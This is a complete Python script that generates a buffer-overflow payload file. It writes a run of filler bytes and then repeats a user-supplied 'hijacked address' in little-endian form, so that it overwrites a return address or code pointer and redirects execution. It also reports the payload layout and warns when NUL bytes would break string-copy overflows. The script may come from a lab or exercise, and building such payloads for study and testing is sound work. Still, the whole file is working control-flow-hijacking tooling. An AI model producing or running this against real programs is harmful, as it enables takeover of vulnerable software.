#!/usr/bin/env python3
import argparse
from pathlib import Path


def parse_address(text):
    return int(text, 0)


parser = argparse.ArgumentParser()
parser.add_argument("-o", "--output", default="input")
parser.add_argument("--addr", required=True, type=parse_address, help="hijacked address, for example 0x140001000")
parser.add_argument("--prefix-length", type=int, default=12, help="bytes before the overflow area, default: 12")
parser.add_argument("--repeat", type=int, default=16, help="number of repeated addresses after the prefix")
parser.add_argument("--fill", default="A", help="single byte used before the overflow area")
args = parser.parse_args()

if args.prefix_length < 0:
    raise SystemExit("--prefix-length must be non-negative")
if args.repeat <= 0:
    raise SystemExit("--repeat must be positive")

fill = args.fill.encode("ascii")
if len(fill) != 1:
    raise SystemExit("--fill must be one ASCII byte")

address = args.addr.to_bytes(8, byteorder="little", signed=False)
payload = fill * args.prefix_length + address * args.repeat

Path(args.output).write_bytes(payload)

print(f"hijacked address: 0x{args.addr:016x}")
print(f"address bytes: {address.hex(' ')}")
print(f"prefix length: {args.prefix_length}")
print(f"repeated addresses: {args.repeat}")
print(f"wrote {len(payload)} bytes to {Path(args.output).resolve()}")
if b"\x00" in address:
    print("note: address contains NUL bytes; use memcpy/memmove/loop-style tests, not strcpy/sprintf")
